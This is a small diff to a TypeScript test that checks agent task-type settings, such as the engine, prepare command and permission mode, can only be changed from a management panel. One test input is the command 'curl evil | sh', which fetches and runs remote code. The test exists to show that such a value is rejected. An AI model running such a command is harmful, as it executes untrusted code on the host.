@@ -908,7 +908,7 @@ it('lets only the panel change the execution environment, since it decides what 
   const native = { id: 'native', name: 'Native', description: 'Native work.', directory: join(directory, 'native') }
   for (const origin of ['tool', 'sync'] as const) {
     for (const profile of [{ engine: 'claude-code' }, { prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] },
-      { claude: { model: 'claude-x', permissionMode: 'plan', approval: 'deny', effort: 'high', ultracode: true } },
+      { claude: { permissionMode: 'plan', approval: 'deny', ultracode: true } },
       { opencode: { approval: 'deny', permissionPreset: 'safe' } }]) {
       await expect(save({ taskTypes: [{ ...native, ...profile }] }, origin)).rejects.toThrow('can only be changed in the management panel')
     }
